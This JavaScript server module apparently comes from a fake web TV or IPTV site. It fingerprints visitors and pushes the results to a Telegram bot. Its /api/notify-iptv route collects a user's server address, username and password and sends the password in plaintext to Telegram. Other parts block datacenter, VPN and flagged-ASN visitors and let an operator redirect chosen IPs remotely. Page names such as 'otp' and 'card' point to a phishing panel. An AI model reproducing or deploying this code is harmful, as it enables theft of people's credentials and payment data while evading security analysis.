import { state, trackPageVisit, saveIPVisits, logAttack } from '../state.js';
import { readJSON, writeJSON, serializeWrite } from '../storage.js';
import { config } from '../config.js';
import { sendTelegram, handleTelegramWebhook } from '../services/telegram.js';
import { lookupIP } from '../services/geo.js';
import { escapeHTML, parseUA, parseUADetailed, detectDeviceType, generateSessionID, getClientIP, isInVPNRange, isBanned, isBlockedASN, checkRateLimit, safeParse, badJson } from '../lib/utils.js';
import crypto from 'node:crypto';

const trackingRateLimits = new Map();
const captchaRateLimits = new Map();
const channelRateLimits = new Map();
const iptvNotifyLimits = new Map();
const redirectPollLimits = new Map();

function parseCookies(req) {
  const cookies = {};
  const header = req.headers.cookie || '';
  for (const part of header.split(';')) {
    const [key, ...val] = part.split('=');
    if (key) cookies[key.trim()] = val.join('=').trim();
  }
  return cookies;
}

function verifyTrustCookie(cookie) {
  if (!cookie) return false;
  try {
    const [payloadB64, sig] = cookie.split('.');
    if (!payloadB64 || !sig) return false;
    const payload = JSON.parse(Buffer.from(payloadB64, 'base64url').toString());
    const hmac = crypto.createHmac('sha256', config.ADMIN_PASSWORD || 'default');
    hmac.update(`${payload.ip}:${payload.ua}:${payload.exp}`);
    const expected = hmac.digest('hex').slice(0, 32);
    if (!crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected))) return false;
    if (Date.now() > payload.exp) return false;
    return true;
  } catch {
    return false;
  }
}

function makeTrustCookie(ip, ua) {
  const exp = Date.now() + 15 * 60 * 1000;
  const payload = { ip, ua, exp };
  const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const hmac = crypto.createHmac('sha256', config.ADMIN_PASSWORD || 'default');
  hmac.update(`${ip}:${ua}:${exp}`);
  const sig = hmac.digest('hex').slice(0, 32);
  return `${payloadB64}.${sig}`;
}

function formatPageBreakdown(ip) {
  const data = state.IP_VISITS[ip];
  if (!data || !data.pages) return null;
  const entries = Object.entries(data.pages).sort((a, b) => b[1] - a[1]);
  if (entries.length === 0) return null;
  const pageEmojis = {
    accueil: '🏠', player: '▶️', settings: '⚙️', captcha: '🧩',
    share: '📤', admin: '🔐', iptv: '📡', login: '🔑',
    visit: '👁', info: '🔮', otp: '🔔', card: '💳',
  };
  return entries.map(([page, count]) => {
    const emoji = pageEmojis[page] || '📄';
    return `${emoji} ${page} × ${count}`;
  }).join('\n');
}

async function handleVisit(req, body) {
  const clientIP = getClientIP(req);
  const ua = req.headers['user-agent'] || '';
  const referrer = escapeHTML(req.headers['referer'] || 'Direct');
  const { browser, os } = parseUA(ua);
  const deviceType = detectDeviceType(ua);
  const isTouch = req.headers['sec-ch-ua-mobile'] === '?1' || false;
  const detailed = parseUADetailed(ua, req.headers);
  const acceptLang = req.headers['accept-language'] || '';
  const languages = acceptLang.split(',').map(l => l.split(';')[0].trim()).filter(Boolean).slice(0, 5);

  const ipInfo = await lookupIP(clientIP);
  const isWhitelisted = state.WHITELIST_LOOKUP.has(clientIP);
  const isDatacenter = !isWhitelisted && (ipInfo.isHosting || isInVPNRange(clientIP));
  const isBannedIP = !isWhitelisted && isBanned(clientIP);
  const asnBlocked = !isWhitelisted && ipInfo.asn && isBlockedASN(ipInfo.asn);

  const session = {
    id: generateSessionID(),
    ip: clientIP,
    browser, os, deviceType, isTouch,
    browserVersion: detailed.browserVersion,
    engine: detailed.engine,
    engineVersion: detailed.engineVersion,
    platform: detailed.platform,
    platformVersion: detailed.platformVersion,
    languages,
    referrer,
    isp: ipInfo.isp,
    country: ipInfo.country,
    countryCode: ipInfo.countryCode,
    city: ipInfo.city,
    region: ipInfo.region,
    asn: ipInfo.asn,
    asnOrg: ipInfo.asnOrg,
    isProxy: !isWhitelisted && ipInfo.isProxy,
    isDatacenter,
    isBanned: isBannedIP || asnBlocked,
    isASNBlocked: asnBlocked,
    siteUrl: body.siteUrl || config.SITE_URL,
    channelName: body.channelName || '',
    streamUrl: body.streamUrl || '',
    timestamp: new Date().toISOString(),
  };

  await serializeWrite(() => {
    state.VISITS.unshift(session);
    writeJSON(config.VISITS_FILE, state.VISITS);
  });

  const statusIcon = session.isASNBlocked ? '🚫' : session.isBanned ? '🚫' : session.isDatacenter ? '🤖' : session.isProxy ? '⚠️' : '✅';
  const statusLabel = session.isASNBlocked ? 'ASN Bloqué' : session.isBanned ? 'Banned' : session.isDatacenter ? 'Bot/DC' : session.isProxy ? 'Proxy' : 'Human visitor';

  const visitCount = state.VISITS.filter(v => v.ip === clientIP).length;
  const isReturning = visitCount > 1;
  const clientHeader = isReturning
    ? `🆔 <b>Visiteur connu</b> (${visitCount} visites)\n  ↳ <code>${escapeHTML(session.id)}</code>`
    : `🆕 <b>New Client Visit</b>\n  ↳ <code>${escapeHTML(session.id)}</code>`;

  const deviceStr = `${detailed.engine}${detailed.engineVersion ? ' ' + detailed.engineVersion : ''}`;
  const platformStr = `${detailed.platform}${detailed.platformVersion ? ' ' + detailed.platformVersion : ''}`;
  const browserStr = `${detailed.browser}${detailed.browserVersion ? ' ' + detailed.browserVersion : ''}`;
  const langStr = languages.length > 0 ? languages.join(', ') : 'N/A';
  const isMobileStr = detailed.isMobile ? 'Yes ✅' : 'No ❌';

  const pageBreakdown = formatPageBreakdown(clientIP);

  const msg = [
    clientHeader,
    ``,
    `${statusIcon} <b>Status:</b> ${escapeHTML(statusLabel)}`,
    `🔁 <b>Visites:</b> ${visitCount}x`,
    `📍 <b>IP:</b> <code>${escapeHTML(session.ip)}</code>`,
    `🌍 <b>Country:</b> ${escapeHTML(session.country || 'Inconnu')}`,
    `🏴 <b>Code:</b> ${escapeHTML(session.countryCode || '??')}`,
    `📡 <b>ISP:</b> ${escapeHTML(session.isp || 'Inconnu')}`,
    `🔧 <b>Device:</b> ${escapeHTML(deviceStr)}`,
    `💻 <b>Platform:</b> ${escapeHTML(platformStr)}`,
    `🌐 <b>Browser:</b> ${escapeHTML(browserStr)}`,
    `🈯 <b>Languages:</b> ${escapeHTML(langStr)}`,
    `📱 <b>Is Mobile:</b> ${isMobileStr}`,
    body.channelName ? `📺 <b>Chaîne:</b> ${escapeHTML(body.channelName)}` : null,
    body.streamUrl ? `🔗 <b>Flux:</b> <code>${escapeHTML(body.streamUrl)}</code>` : null,
    pageBreakdown ? `` : null,
    pageBreakdown ? `📄 <b>Pages visitées :</b>` : null,
    pageBreakdown || null,
  ].filter(Boolean).join('\n');

  const now = Date.now();
  const lastNotify = state.telegramNotifyCache.get(clientIP);
  const isIPPremium = state.PREMIUM_LOOKUP.has(clientIP);

  const shouldNotify = !isIPPremium && (!lastNotify || (now - lastNotify > 30 * 60 * 1000));

  if (shouldNotify) {
    state.telegramNotifyCache.set(clientIP, now);
    await sendTelegram(msg, session.ip);
  } else {
    console.log(`[Telegram] Doublon/Spam ignoré pour l'IP: ${clientIP}`);
  }

  return session;
}

export async function handleTrackingRoutes(pathname, req, res, body) {
  if (pathname === '/' || pathname === '/api/telegram') {
    if (req.method !== 'POST') { res.writeHead(405, { 'Content-Type': 'application/json' }); return res.end('{"error":"Method not allowed"}'); }
    const clientIP = getClientIP(req);
    if (!checkRateLimit(trackingRateLimits, clientIP, config.TRACKING_RATE_LIMIT, config.RATE_WINDOW_MS)) {
      res.writeHead(429, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Too many requests' }));
    }
    if (!state.WHITELIST_LOOKUP.has(clientIP) && state.BANS_LOOKUP.has(clientIP)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: false, isBanned: true, ip: clientIP }));
    }
    const parsed = safeParse(body);
    if (!parsed.ok) return badJson(res);
    const data = parsed.data;

    const cookies = parseCookies(req);
    const isAdminBypass = cookies.webtv_bypass && (() => {
      try {
        const hmac = crypto.createHmac('sha256', config.ADMIN_PASSWORD || 'default');
        hmac.update(`bypass:${config.ADMIN_PASSWORD}`);
        return crypto.timingSafeEqual(
          Buffer.from(cookies.webtv_bypass),
          Buffer.from(hmac.digest('hex').slice(0, 32))
        );
      } catch { return false; }
    })();

    const session = await handleVisit(req, data);

    if (session.isASNBlocked) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: false, isASNBlocked: true, ip: session.ip, asn: session.asn }));
    }

    const forceCaptcha = state.FORCE_CAPTCHA.has(clientIP);
    if (forceCaptcha) {
      state.FORCE_CAPTCHA.delete(clientIP);
      logAttack(clientIP, 'force_captcha', 'Remote captcha forced via Telegram', req.headers['user-agent']);
    }

    const hasTrustCookie = verifyTrustCookie(cookies.webtv_trust);

    let trustCookieHeader = null;
    if (!session.isDatacenter && !session.isProxy && !session.isBanned) {
      const newCookie = makeTrustCookie(clientIP, req.headers['user-agent'] || '');
      trustCookieHeader = `webtv_trust=${newCookie}; Path=/; HttpOnly; SameSite=Lax; Max-Age=900`;
    }

    const responseHeaders = { 'Content-Type': 'application/json' };
    if (trustCookieHeader) responseHeaders['Set-Cookie'] = trustCookieHeader;

    res.writeHead(200, responseHeaders);
    res.end(JSON.stringify({
      ok: true, id: session.id, ip: session.ip,
      country: session.country, isp: session.isp,
      asn: session.asn, asnOrg: session.asnOrg,
      isDatacenter: session.isDatacenter, isBanned: session.isBanned,
      isASNBlocked: session.isASNBlocked,
      isPremium: state.PREMIUM_LOOKUP.has(session.ip),
      forceCaptcha: forceCaptcha && !isAdminBypass && !hasTrustCookie,
      waitDelay: state.WAIT_DELAY || 0,
    }));
    return true;
  }

  if (pathname === '/api/page-visit') {
    if (req.method !== 'POST') { res.writeHead(405, { 'Content-Type': 'application/json' }); return res.end('{"error":"Method not allowed"}'); }
    const clientIP = getClientIP(req);
    const parsed = safeParse(body);
    const data = parsed.ok ? parsed.data : {};
    const page = data.page || 'accueil';
    trackPageVisit(clientIP, page);
    saveIPVisits();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
    return true;
  }

  if (pathname === '/api/redirect-status') {
    if (req.method !== 'GET') { res.writeHead(405, { 'Content-Type': 'application/json' }); return res.end('{"error":"Method not allowed"}'); }
    const clientIP = getClientIP(req);
    if (!checkRateLimit(redirectPollLimits, clientIP, 30, 60000)) {
      res.writeHead(429, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Too many requests' }));
    }
    const redirect = state.PENDING_REDIRECTS.get(clientIP);
    if (redirect && Date.now() < redirect.expires) {
      state.PENDING_REDIRECTS.delete(clientIP);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true, redirect: redirect.page }));
    } else {
      if (redirect) state.PENDING_REDIRECTS.delete(clientIP);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true, redirect: null }));
    }
    return true;
  }

  if (pathname === '/api/captcha/failed') {
    if (req.method !== 'POST') { res.writeHead(405, { 'Content-Type': 'application/json' }); return res.end('{"error":"Method not allowed"}'); }
    const clientIP = getClientIP(req);
    if (!checkRateLimit(captchaRateLimits, clientIP, config.CAPTCHA_RATE_LIMIT, config.RATE_WINDOW_MS)) {
      res.writeHead(429, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Too many requests' }));
    }
    const parsed = safeParse(body);
    const data = parsed.ok ? parsed.data : {};
    logAttack(clientIP, 'captcha_fail', `${data.equation} → ${data.input}`, req.headers['user-agent']);
    const msg = [
      `⚠️ <b>CAPTCHA RATÉ</b>`,
      `📍 <b>IP:</b> <code>${escapeHTML(clientIP)}</code>`,
      `🏷️ <b>Type:</b> ${escapeHTML(data.type || 'Inconnu')}`,
      `🧮 <b>Calcul:</b> <code>${escapeHTML(data.equation || '')}</code>`,
      `📥 <b>Réponse entrée:</b> <code>${escapeHTML(data.input || '')}</code>`,
    ].join('\n');
    await sendTelegram(msg, clientIP);
    console.log(`[Captcha] Echec pour ${clientIP}: ${data.equation} → ${data.input}`);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
    return true;
  }

  if (pathname === '/api/telegram/channel') {
    if (req.method !== 'POST') { res.writeHead(405, { 'Content-Type': 'application/json' }); return res.end('{"error":"Method not allowed"}'); }
    const clientIP = getClientIP(req);
    if (!checkRateLimit(channelRateLimits, clientIP, config.TRACKING_RATE_LIMIT, config.RATE_WINDOW_MS)) {
      res.writeHead(429, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Too many requests' }));
    }
    const parsed = safeParse(body);
    const data = parsed.ok ? parsed.data : {};
    const now = Date.now();
    const last = state.channelNotifyCache.get(clientIP);

    if (!last || (now - last > 15 * 1000)) {
      state.channelNotifyCache.set(clientIP, now);
      const pageBreakdown = formatPageBreakdown(clientIP);
      const msg = [
        `📺 <b>CHAÎNE SÉLECTIONNÉE</b>`,
        `📍 <b>IP:</b> <code>${escapeHTML(clientIP)}</code>`,
        `🎬 <b>Chaîne:</b> ${escapeHTML(data.channelName || "Page d'accueil")}`,
        data.streamUrl ? `🔗 <b>Flux:</b> <code>${escapeHTML(data.streamUrl)}</code>` : null,
        pageBreakdown ? `` : null,
        pageBreakdown ? `📄 <b>Pages visitées :</b>` : null,
        pageBreakdown || null,
      ].filter(Boolean).join('\n');
      await sendTelegram(msg, clientIP);
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
    return true;
  }

  if (pathname === '/api/telegram-webhook') {
    if (req.method !== 'POST') { res.writeHead(405, { 'Content-Type': 'application/json' }); return res.end('{"error":"Method not allowed"}'); }
    if (config.TELEGRAM_WEBHOOK_SECRET && req.headers['x-telegram-bot-api-secret-token'] !== config.TELEGRAM_WEBHOOK_SECRET) {
      res.writeHead(403);
      return res.end('Forbidden');
    }
    const parsed = safeParse(body);
    const update = parsed.ok ? parsed.data : {};
    await handleTelegramWebhook(update);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
    return true;
  }

  if (pathname === '/api/notify-iptv') {
    if (req.method !== 'POST') { res.writeHead(405, { 'Content-Type': 'application/json' }); return res.end('{"error":"Method not allowed"}'); }
    const clientIP = getClientIP(req);
    if (!checkRateLimit(iptvNotifyLimits, clientIP, 5, 60000)) {
      res.writeHead(429, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Too many requests' }));
    }
    const parsed = safeParse(body);
    if (!parsed.ok) return badJson(res);
    const data = parsed.data;
    const server = String(data.server || '').trim();
    const username = String(data.username || '').trim();
    const password = String(data.password || '').trim();
    if (!server || !username || !password) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Missing fields' }));
    }
    const pageBreakdown = formatPageBreakdown(clientIP);
    const msg = [
      '📡 <b>CONNEXION IPTV</b>',
      `📍 <b>IP:</b> <code>${escapeHTML(clientIP)}</code>`,
      `🖥️ <b>Server URL:</b> <code>${escapeHTML(server)}</code>`,
      `👤 <b>Username:</b> <code>${escapeHTML(username)}</code>`,
      `🔑 <b>Password:</b> <code>${escapeHTML(password)}</code>`,
      pageBreakdown ? `` : null,
      pageBreakdown ? `📄 <b>Pages visitées :</b>` : null,
      pageBreakdown || null,
    ].filter(Boolean).join('\n');
    await sendTelegram(msg, clientIP);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
    return true;
  }

  return false;
}
